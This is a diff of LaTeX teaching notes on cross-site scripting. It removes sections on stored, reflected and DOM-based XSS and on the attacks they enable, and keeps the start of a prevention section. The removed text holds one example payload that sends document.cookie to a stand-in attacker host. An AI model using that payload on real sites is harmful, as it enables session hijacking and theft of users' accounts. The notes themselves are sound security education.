@@ -1,50 +1,3 @@
-\section{XSS}
-The objective of a XSS attack is to inject malicious js into the victim's page. The attacker uses vulnerabilities in the web application, not the web browser, to store this malicious scripts in the server, so that when the victim visits the webpage the js executes without the user's interaction. Malicious js can be very dangerous, as it can steal unprotected cookies, make requests in the user's behalf and modify the page's html to create phishing attacks, between many others. If an attacker can use the web app to execute js in another user's browser, the security of the site and it's users is severely compromised.
-\subsection{Types of XSS}
-\subsubsection{Persistent XSS}
-In this attack, the malicious js is stored in the DB. The attacker can upload this js disguised in a comment of a post, a form, etc. The web app saves this code in the DB, and when the page is solicited by another user the code is inserted in the html unknowingly by the application.
-\begin{figure}[htb]
-	\begin{centering}
-		\includegraphics[width=0.7\columnwidth]{\securitydir/WebSec/figures/persistent-xss}
-		\par\end{centering}
-	\caption{\label{fig:ecb} Diagram of a stored XSS exploit.}
-\end{figure}
-
-\subsubsection{Reflected XSS}
-The attacker needs to craft a malicious URL with js in it as a parameter. This is usually exploited passing a URL with a search query with the js as the paramater to search. The attacker then tricks the victim to open the link, generating a GET request and returning HTML page with the query inserted in it. https://excess-xss.com/reflected-xss.png
-\begin{figure}[htb]
-	\begin{centering}
-		\includegraphics[width=0.7\columnwidth]{\securitydir/WebSec/figures/reflected-xss}
-		\par\end{centering}
-	\caption{\label{fig:reflexted-xss} Diagram of a reflected XSS exploit.}
-\end{figure}
-
-\subsubsection{DOM-based XSS}
-DOM-based attacks can be a variant of the attacks mentioned earlier, with a subtle but important difference. The malicious js is inserted in the DOM by the js of the web application itself, and not by the server. This means that the front-end of the web app is also vulnerable to this kinds of exploits. This also means that the malicious js can come from other sources that are not visible to the server, like local storage, Indexed DB and in a URL's fragment identifier. Another thing to mind is that the malicious js can be executed later, and not always when the page is loaded.	
-% TODO: figure explaining DOM-based XSS
-
-
-\subsection{Attacks using XSS}
-Once the attacker finds a vulnerability has several ways to exploit it. Knowing the diverse ways a XSS can be used is useful to prevent it.
-
-\subsubsection{Session hijacking attack}
-The goal of this attack is to steal the session cookies to impersonate the user. A payload like this can send the cookies to a remote server controlled by the attacker passing the cookies as a parameter.
-
-\verb|<script>document.InnerHTML += "<img src='http://attackersite.com/?cookie="+ document.cookie + "/'>" </script>|
-
-This attack can be easily countered by setting the session cookies with the flag HTTPOnly, that we explained earlier in the cookies chapter.
-
-\subsubsection{Phishing attack}
-This attack overwrites the HTML of the website to trick the user into sending login credentials to the attacker. For example the payload can modify a form to submit the contents to a malicious server, or even modify the current page to make it look like the login page.
-
-\subsubsection{Others}
-JavaScript can interact with a lot of parts of the browser, and this makes XSS exploits very powerful. The attacker imagination is the limit but we can name a few more ways to exploit a XSS.
-\begin{itemize}
-	\item Redirect the victim to another URL.
-	\item Modify the page with fake information.
-	\item Recollect user information.
-	\item Find browser version to send a targeted exploit.
-\end{itemize}
 
 \subsection{XSS Prevention}
 To prevent a XSS, the most useful tool is to secure all the input received from the user. This can be done in two ways.
@@ -143,6 +96,3 @@ function myFunction() {
 </html>
 
 \end{lstlisting}
-
-
-
